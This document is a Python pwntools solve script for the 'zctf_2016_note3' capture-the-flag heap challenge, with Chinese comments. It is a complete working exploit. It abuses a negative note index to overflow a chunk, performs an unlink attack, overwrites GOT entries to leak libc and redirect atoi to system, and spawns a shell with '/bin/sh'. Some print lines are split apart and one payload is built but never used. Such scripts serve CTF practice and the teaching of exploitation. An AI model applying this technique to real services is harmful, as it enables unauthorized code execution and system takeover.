# coding:utf8
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
sh = process('./zctf_2016_note3')
# sh = remote('node3.buuoj.cn', 29603)
elf = ELF('./zctf_2016_note3')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
atoi_got = elf.got['atoi']
free_got = elf.got['free']
puts_plt = elf.plt['puts']
heap_0_ptr_addr = 0x00000000006020C8


def add(size, content):
    sh.sendlineafter('option--->>', '1')
    sh.sendlineafter('(less than 1024)', str(size))
    sh.sendafter('content:', content[0:size - 1])


def edit(index, content):
    sh.sendlineafter('option--->>', '3')
    sh.sendlineafter('Input the id of the note:', str(index))
    sh.sendafter('Input the new content:', content)


def delete(index):
    sh.sendlineafter('option--->>', '4')
    sh.sendlineafter('Input the id of the note:', str(index))
def dbg():
	gdb.attach(sh)
	pause()

# 0
add(0x100, 'a' * 0x100)
# 1
add(0x100, 'b' * 0x100)
# 2
add(0x10, 'c' * 0x10)
# 3
add(0x10, 'c' * 0x10)
# 4
add(0x10, 'c' * 0x10)
# 5
add(0x10, 'c' * 0x10)
# 6 #这里覆盖到了heap[-1]对于的size，导致溢出
add(0x10, 'c' * 0x10)

# 让heaps[-1]即real_heap[0]为heaps[0]
delete(0)
add(0x100, 'a' * 0x100)
# 现在，通过让index为-1，就可以溢出chunk0
payload = p64(0) + p64(0x101)
payload += p64(heap_0_ptr_addr - 0x18) + p64(heap_0_ptr_addr - 0x10)
payload = payload.ljust(0x100, 'a')
payload += p64(0x100) + p64(0x110)
payload += '\n'
#使用特殊整数0x8000000000000000转为负数的形式输入进去即可
edit(0x8000000000000000 - 0x10000000000000000, payload)
# dbg()
# unlink
delete(1)
payload = p64(0) * 3 + p64(free_got) + p64(atoi_got) * 2
payload = payload.ljust(80, '\x00')
payload += p64(0x8) * 3
edit(0, p64(0) * 3 + p64(free_got) + p64(atoi_got) * 2 + '\n')
# 修改free的got表为puts的plt表
edit(0, p64(puts_plt)[0:7] + '\n')
# 泄露atoi地址
delete(1)
sh.recvuntil('\n')
atoi_addr = u64(sh.recv(6).ljust(8, '\x00'))
libc_base = atoi_addr - libc.sym['atoi']
system_addr = libc_base + libc.sym['system']
print
'libc_base=', hex(libc_base)
print
'system_addr=', hex(system_addr)
# 修改atoi的got表为system地址
edit(2, p64(system_addr)[0:7] + '\n')
# getshell
sh.sendlineafter('option--->>', '/bin/sh\x00')

sh.interactive()